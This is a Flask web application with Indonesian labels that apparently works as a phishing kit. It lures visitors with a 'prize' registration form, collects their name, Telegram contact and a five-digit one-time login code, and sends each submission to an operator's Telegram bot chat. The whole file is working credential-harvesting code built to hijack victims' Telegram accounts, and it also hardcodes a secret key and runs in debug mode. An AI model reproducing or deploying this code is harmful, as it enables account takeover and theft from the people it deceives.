from flask import Flask, render_template, request, redirect, session
import requests
import os

app = Flask(__name__)
app.secret_key = 'j1s34ft43utbu76'

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

@app.route('/')
def home():
    # Halaman 1 hanya tampil gambar full body
    return render_template('home.html')

@app.route("/registrasi", methods=['GET', 'POST'])
def registrasi():
    if request.method == 'POST':
        nama = request.form.get('nama')
        Telegram = request.form.get('Telegram')
        hadiah = request.form.get('hadiah')

        session['nama'] = nama
        session['Telegram'] = Telegram
        session['hadiah'] = hadiah

        teks_awal = (
            "🔔DATA BARU (AWAL):\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"📱Telegram: {Telegram}\n"
            f"🎁hadiah: {hadiah}"
        )

        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload={'chat_id': TELEGRAM_CHAT_ID, 'text': teks_awal}

        requests.post(url, data=payload)

        return redirect('/close')
    return render_template('registrasi.html')

@app.route("/close", methods=["GET", "POST"])
def close():
    if request.method == 'POST':
        otp = ''.join([
            request.form.get('otp1', ''), request.form.get('otp2', ''), request.form.get('otp3', ''), request.form.get('otp4', ''), request.form.get('otp5', '')
        ])

        nama = session.get('nama')
        Telegram = session.get('Telegram')
        hadiah = session.get('hadiah')

        caption = (
            "🔔DATA BARU (AKHIR):\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"📱Telegram: {Telegram}\n"
            f"🎁hadiah: {hadiah}\n"
            f"🗝otp: {otp}"
        )

        requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
                data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption}
            )

        return render_template('close.html', sukses=True)
    return render_template('close.html')

if __name__ == '__main__':
    app.run(debug=True)
